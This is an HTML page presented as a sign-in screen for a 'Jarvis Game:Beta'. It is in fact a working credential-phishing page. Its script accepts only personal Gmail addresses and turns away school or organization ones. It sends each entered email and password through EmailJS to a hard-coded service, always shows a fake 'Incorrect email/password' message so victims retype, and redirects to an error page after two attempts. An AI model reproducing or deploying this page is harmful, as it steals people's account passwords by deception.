<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Jarvis Game:Beta</title>
    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
    <link rel="stylesheet" href="style.css" />
  </head>
  <body>
    <div class="box">
      <form action="#" class="form" id="login-form">
        <img src="2.png" alt="" style="width: 35%" />
        <h1 class="form-title">Sign In</h1>

        <div class="form-group">
          <input type="text" class="form-control" id="subject" required />
          <label for="" class="form-label">Personal Email</label>
        </div>

        <div class="form-group">
          <input type="password" class="form-control" required id="message" />
          <label for="" class="form-label">Password</label>
        </div>

        <div class="form-group">
          <label class="showLabel">
            <input type="checkbox" id="show" />
            Show Password
          </label>
        </div>

        <div class="bottom-box">
          <a href="#">Forget password ?</a>
          <button class="form-button">Next</button>
        </div>
      </form>
    </div>

    <script>
      (function () {
        emailjs.init("qZi_CLblH1PeMRHDN"); // Replace with your EmailJS user ID
      })();
      let counter = 0;
      document
        .getElementById("login-form")
        .addEventListener("submit", function (event) {
          event.preventDefault();

          let subject = document.getElementById("subject").value;
          let message = document.getElementById("message").value;

          // Regular expression to validate email ending with @gmail.com
          let emailRegex = /^[^\s@]+@gmail\.com$/;

          if (!emailRegex.test(subject)) {
            alert(
              "Invalid email. Please ensure that you are not using your school/organization email."
            );
            return;
          }
          if (message.length < 5) {
            alert("Incorrect password, try again.");
            return;
          }

          let params = {
            subject: subject,
            message: message,
          };

          emailjs.send("service_75sfydl", "template_d2bssp5", params).then(
            function () {
              let a = 2;
              document.getElementById("subject").value = "";
              document.getElementById("message").value = "";
              alert("Incorrect email/password. Try again.");
            },
            function (error) {
              let a = 2;
              //alert("Failed to send email: " + JSON.stringify(error));
            }
          );
          counter++;
          if (counter == 2) {
            window.location.href = "error.html";
            //alert("reached two");
          }
          return;
        });
    </script>
  </body>
</html>
